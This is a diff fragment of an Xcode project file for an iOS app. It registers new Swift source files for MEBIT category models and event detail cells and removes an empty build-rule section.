+				E375EA79262EE9B100646A0A /* DetailCommentLikeTVCell.swift in Sources */,
 				5CED911A2605DF0F001053DD /* MEBITViewController.swift in Sources */,
+				E375EA8D262F3E4900646A0A /* MEBITCat_Model.swift in Sources */,
 				5C021C572610280500759B96 /* KaizenVideoLinkModel.swift in Sources */,
 				E3E2CC23260B4E3A009BDB6E /* APIClient.swift in Sources */,
 				E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */,
 				E32AED4A260754F000AEAB6F /* AppConstant.swift in Sources */,
+				E375EA2E262EADAE00646A0A /* DetailCoverImageTVCell.swift in Sources */,
 				E3045C3D2603C95E00D1A678 /* FooterTabView.swift in Sources */,
+				E375EA8A262F3E4900646A0A /* Hydrogen_MEBITCat.swift in Sources */,
 				E32F3BF8262AFCDC0000D92A /* MEBITCollectionViewCell.swift in Sources */,
 				5C1A09DE260C353500223D3D /* DivisionModel.swift in Sources */,
+				E375EA3F262EB7C600646A0A /* DetailAboutEventTVCell.swift in Sources */,
 				5CED90F92605A67F001053DD /* AddImageCollectionViewCell.swift in Sources */,
 				E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */,
 				5CD5B26C260F970E00D63564 /* MEBITDataModel.swift in Sources */,
+				E375EA6F262EDC0C00646A0A /* DetailDocLinkTVCell.swift in Sources */,
 				E32F3BEF262AFCA90000D92A /* MEBITEventTableViewCell.swift in Sources */,
 				E32AED3C260754A100AEAB6F /* UIColor.swift in Sources */,
 				E3E2CCCF260B6029009BDB6E /* LoginUserModel.swift in Sources */,
 				E30751B0260F3908000EB1EA /* HomeModel.swift in Sources */,
+				E375EA88262F3E4900646A0A /* Maas_MEBITCat.swift in Sources */,
 				E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */,
 				E32AECF326073E3000AEAB6F /* LoginVM.swift in Sources */,
 				5CED90F226059540001053DD /* CategoryCommonViewController.swift in Sources */,
 				5C021C5C26102B4900759B96 /* KaizenVM.swift in Sources */,
+				E375EA87262F3E4900646A0A /* Kaizen_MEBITCat.swift in Sources */,
+				E375EA54262ECD2600646A0A /* DocumentContentCell.swift in Sources */,
 				E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */,
 				E32AED0F2607538500AEAB6F /* BaseTableHeaderView.swift in Sources */,
 				E32F3BE8262AFC710000D92A /* MEBITEventVC.swift in Sources */,
 				E31F1DCF2607BF8800830F2B /* CategoriesVM.swift in Sources */,
 				E325445B261098910083BDD9 /* EventInfoModel.swift in Sources */,
+				E375EA8C262F3E4900646A0A /* News_MEBITCat.swift in Sources */,
 				E3F7C5F626145F6F0018C377 /* NewCarKaizenModel.swift in Sources */,
 				E32AED43260754C700AEAB6F /* ThemeManager.swift in Sources */,
 				E39467852614EA3400B9503B /* MedbiListModel.swift in Sources */,
@@ -1596,16 +1718,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
